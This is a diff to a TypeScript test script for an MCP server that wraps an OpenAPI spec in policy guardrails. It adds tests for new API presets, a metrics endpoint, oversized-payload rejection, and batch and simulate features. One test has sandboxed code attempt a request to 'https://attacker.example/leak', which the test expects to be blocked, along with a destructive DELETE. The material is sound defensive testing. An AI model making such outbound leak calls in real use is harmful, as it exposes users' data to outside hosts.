@@ -177,9 +177,17 @@ async function runProofOfConcept() {
     console.log(`    - [${attempt.isError ? "BLOCKED" : "ALLOWED"}] ${t.label.padEnd(26)} -> ${JSON.parse(attempt.content[0].text).error}`);
   }
 
-  // 5. Test CLI API Presets (Cloudflare, GitHub, Stripe, Kubernetes)
+  // 5. Test CLI API Presets (Cloudflare, GitHub, Stripe, Kubernetes, OpenAI, Slack, DigitalOcean)
   console.log("\n[5] TESTING CLI API PRESETS (API_PRESETS Export & CLI flag parsing)");
-  const requiredPresets = ["cloudflare", "github", "stripe", "kubernetes"] as const;
+  const requiredPresets = [
+    "cloudflare",
+    "github",
+    "stripe",
+    "kubernetes",
+    "openai",
+    "slack",
+    "digitalocean",
+  ] as const;
   for (const presetKey of requiredPresets) {
     const preset = API_PRESETS[presetKey];
     if (!preset) {
@@ -732,14 +740,37 @@ paths:
       status: string;
       endpointsIndexed: number;
       tools: string[];
+      metrics?: { endpointsIndexed: number };
     };
     if (
       healthRes.status !== 200 ||
       healthJson.status !== "ok" ||
       healthJson.endpointsIndexed !== 3 ||
-      healthJson.tools.length !== 2
+      healthJson.tools.length !== 2 ||
+      healthJson.metrics?.endpointsIndexed !== 3
     ) {
       throw new Error(`Unexpected /health response: ${JSON.stringify(healthJson)}`);
+    }
+
+    const metricsRes = await fetch(`${startedHttp.url}/metrics`);
+    const metricsJson = (await metricsRes.json()) as { endpointsIndexed: number };
+    if (metricsRes.status !== 200 || metricsJson.endpointsIndexed !== 3) {
+      throw new Error(`Unexpected /metrics response: ${JSON.stringify(metricsJson)}`);
+    }
+
+    const oversizedPayload = JSON.stringify({
+      jsonrpc: "2.0",
+      id: 99,
+      method: "tools/list",
+      padding: "x".repeat(1024 * 1024 + 512),
+    });
+    const oversizedRes = await fetch(`${startedHttp.url}/mcp`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: oversizedPayload,
+    });
+    if (oversizedRes.status !== 413) {
+      throw new Error(`Expected 413 Payload Too Large for >1MB body, got ${oversizedRes.status}`);
     }
 
     const mcpCallRes = await fetch(`${startedHttp.url}/mcp`, {
@@ -961,6 +992,112 @@ paths:
   } finally {
     await fs.unlink(hardeningYamlFile).catch(() => {});
   }
+
+  // 15. Test New Features: api.batch(), api.simulate(), Tag Discovery & Live Metrics
+  console.log("\n[15] TESTING NEW FEATURES: API.BATCH(), API.SIMULATE(), TAG DISCOVERY & METRICS");
+  const featureSpec: OpenApiSpec = {
+    openapi: "3.0.3",
+    info: { title: "Feature Test API", version: "1.0.0" },
+    servers: [{ url: "https://api.example.com/v1" }],
+    paths: {
+      "/zones": {
+        get: {
+          operationId: "listZones",
+          tags: ["zones"],
+          summary: "List zones",
+          responses: { "200": { description: "OK" } },
+        },
+      },
+      "/dns_records": {
+        get: {
+          operationId: "listDns",
+          tags: ["dns"],
+          summary: "List DNS records",
+          responses: { "200": { description: "OK" } },
+        },
+      },
+    },
+  };
+  const featureServer = new CodeModeMcpServer({
+    spec: featureSpec,
+    policies: auditPolicies,
+    dryRun: true,
+  });
+
+  const tagSearch = await featureServer.handleToolCall("search", { query: "*", tag: "zones" });
+  const parsedTagSearch = JSON.parse(tagSearch.content[0].text) as {
+    availableTags?: string[];
+    matchCount: number;
+    endpoints: Array<{ path: string }>;
+  };
+  if (
+    parsedTagSearch.matchCount !== 1 ||
+    parsedTagSearch.endpoints[0]?.path !== "/zones" ||
+    !parsedTagSearch.availableTags?.includes("zones") ||
+    !parsedTagSearch.availableTags?.includes("dns")
+  ) {
+    throw new Error(`Unexpected tag search output: ${JSON.stringify(parsedTagSearch)}`);
+  }
+
+  const simAndBatchRes = await featureServer.handleToolCall("execute", {
+    code: `
+      const sim = api.simulate([
+        { method: "GET", path: "/zones" },
+        { method: "DELETE", path: "/zones/z1" },
+        { method: "GET", path: "https://attacker.example/leak" }
+      ]);
+      const batch = await api.batch(
+        [
+          { method: "GET", path: "/zones" },
+          { method: "DELETE", path: "/zones/z1" },
+          { method: "GET", path: "/dns_records" }
+        ],
+        { concurrency: 2, continueOnError: true }
+      );
+      return { sim, batch };
+    `,
+  });
+  const parsedSimBatch = JSON.parse(simAndBatchRes.content[0].text) as {
+    result: {
+      sim: { allowed: boolean; totalChecked: number; allowedCount: number; blockedCount: number };
+      batch: {
+        total: number;
+        succeeded: number;
+        failed: number;
+        results: Array<{ index: number; ok: boolean; error?: string }>;
+      };
+    };
+    auditLog: Array<{ status: string }>;
+  };
+  const { sim, batch } = parsedSimBatch.result;
+  if (
+    sim.allowed !== false ||
+    sim.totalChecked !== 3 ||
+    sim.allowedCount !== 1 ||
+    sim.blockedCount !== 2
+  ) {
+    throw new Error(`Unexpected api.simulate result: ${JSON.stringify(sim)}`);
+  }
+  if (
+    batch.total !== 3 ||
+    batch.succeeded !== 2 ||
+    batch.failed !== 1 ||
+    batch.results[1]?.ok !== false ||
+    !batch.results[1]?.error?.includes("block-destructive-delete")
+  ) {
+    throw new Error(`Unexpected api.batch result: ${JSON.stringify(batch)}`);
+  }
+
+  const featureMetrics = featureServer.getMetrics();
+  if (
+    featureMetrics.totalSearches !== 1 ||
+    featureMetrics.totalExecutions !== 1 ||
+    featureMetrics.totalBlockedCalls !== 1 ||
+    featureMetrics.availableTagsCount !== 2
+  ) {
+    throw new Error(`Unexpected telemetry metrics: ${JSON.stringify(featureMetrics)}`);
+  }
+  console.log("    - [VERIFIED] api.simulate(), api.batch() with continueOnError, tag search & getMetrics() telemetry");
 
   console.log("\n==================================================================");
   console.log("  ALL BENCHMARKS, POLICIES & CLI PRESETS PASSED");
